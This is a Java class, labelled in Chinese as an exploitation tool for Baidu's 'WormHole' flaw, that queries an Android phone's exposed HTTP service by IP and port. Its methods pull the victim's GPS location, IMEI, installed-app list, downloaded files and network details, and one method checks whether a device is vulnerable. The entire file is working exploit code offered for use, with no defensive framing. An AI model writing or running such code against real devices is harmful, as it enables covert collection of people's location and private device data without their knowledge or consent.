package me.ihainan.utils;

/**
 * 百度 WormHole 利用工具
 */
public class Wormhole {
    private String ipAddress;    // IP 地址
    private int port;         // 端口编号
    private String targetURL;  // 目标 URL

    /**
     * 构造函数
     *
     * @param ipAddress IP 地址
     * @param port      漏洞端口
     */
    public Wormhole(String ipAddress, int port) {
        this.ipAddress = ipAddress;
        this.port = port;
        targetURL = "http://" + ipAddress + ":" + port;
    }

    /**
     * 获取用户手机的GPS地理位置（城市，经度，纬度）
     *
     * @return 用户手机的GPS地理位置（城市，经度，纬度）
     */
    public String getGeoLocation() {
        targetURL = "http://" + ipAddress + ":" + port + "/geolocation";
        String urlParameters = "callback=callback1&mcmdf=inapp_baidu_bdgjs";
        HTTPUnit.RequestResult requestResult = HTTPUnit.makeRequest(targetURL, urlParameters, HTTPUnit.METHOD.GET);
        return requestResult.errorMessage != null ? requestResult.errorMessage : requestResult.result;
    }

    /**
     * 获取当前的网络状况（WIFI/3G/4G运营商）
     *
     * @return 当前的网络状况（WIFI/3G/4G运营商）
     */
    public String getAPN() {
        targetURL = "http://" + ipAddress + ":" + port + "/getapn";
        String urlParameters = "mcmdf=inapp_";
        HTTPUnit.RequestResult requestResult = HTTPUnit.makeRequest(targetURL, urlParameters, HTTPUnit.METHOD.GET);
        return requestResult.errorMessage != null ? requestResult.errorMessage : requestResult.result;
    }

    public String checkWormHole() {
        targetURL = "http://" + ipAddress + ":" + port;
        HTTPUnit.RequestResult requestResult = HTTPUnit.makeRequest(targetURL, "", HTTPUnit.METHOD.GET);
        return requestResult.errorMessage != null ? "NO :D" : "YES!!!!";
    }

    /**
     * 获取手机应用的版本信息
     *
     * @return 手机应用的版本信息
     */
    public String getPackageInfo() {
        targetURL = "http://" + ipAddress + ":" + port + "/getpackageinfo";
        String urlParameters = "&packagename=com.baidu.BaiduMap&callback=callback1&mcmdf=inapp_";
        HTTPUnit.RequestResult requestResult = HTTPUnit.makeRequest(targetURL, urlParameters, HTTPUnit.METHOD.GET);
        return requestResult.errorMessage != null ? requestResult.errorMessage : requestResult.result;
    }

    /**
     * 获取提供 nano http 的应用信息
     *
     * @return nano http 的应用信息
     */
    public String getServiceInfo() {
        targetURL = "http://" + ipAddress + ":" + port + "/getserviceinfo";
        String urlParameters = "callback=callback1&mcmdf=inapp_";
        HTTPUnit.RequestResult requestResult = HTTPUnit.makeRequest(targetURL, urlParameters, HTTPUnit.METHOD.GET);
        return requestResult.errorMessage != null ? requestResult.errorMessage : requestResult.result;
    }

    /**
     * 获取 IMEI 信息
     *
     * @return IMEI 信息
     */
    public String getIMEI() {
        targetURL = "http://" + ipAddress + ":" + port + "/getcuid";
        String urlParameters = "callback=callback1&mcmdf=inapp_";
        HTTPUnit.RequestResult requestResult = HTTPUnit.makeRequest(targetURL, urlParameters, HTTPUnit.METHOD.GET);
        return requestResult.errorMessage != null ? requestResult.errorMessage : requestResult.result;
    }


    /**
     * 扫描下载文件(UCDownloads/QQDownloads/360Download...)
     *
     * @return 下载文件信息
     */
    public String scanDownloadFile() {
        targetURL = "http://" + ipAddress + ":" + port + "/scandownloadfile";
        String urlParameters = "callback=callback1" +
                "&intent=" +
                "&apkfilelength=" +
                "&apkfilename=" +
                "&apkpackagename=" +
                "&mcmdf=inapp_";
        HTTPUnit.RequestResult requestResult = HTTPUnit.makeRequest(targetURL, urlParameters, HTTPUnit.METHOD.GET);
        return requestResult.errorMessage != null ? requestResult.errorMessage : requestResult.result;
    }

    /**
     * 获取手机百度的版本信息
     *
     * @return 手机百度的版本信息
     */
    public String getSearchBoxInfo() {
        targetURL = "http://" + ipAddress + ":" + port + "/getsearchboxinfo";
        String urlParameters = "callback=callback1&mcmdf=inapp_";
        HTTPUnit.RequestResult requestResult = HTTPUnit.makeRequest(targetURL, urlParameters, HTTPUnit.METHOD.GET);
        return requestResult.errorMessage != null ? requestResult.errorMessage : requestResult.result;
    }

    /**
     * 获取全部安装app信息
     *
     * @return 全部安装app信息
     */
    public String getAppList() {
        targetURL = "http://" + ipAddress + ":" + port + "/getapplist";
        String urlParameters = "callback=callback1&mcmdf=inapp_";
        HTTPUnit.RequestResult requestResult = HTTPUnit.makeRequest(targetURL, urlParameters, HTTPUnit.METHOD.GET);
        return requestResult.errorMessage != null ? requestResult.errorMessage : requestResult.result;
    }
}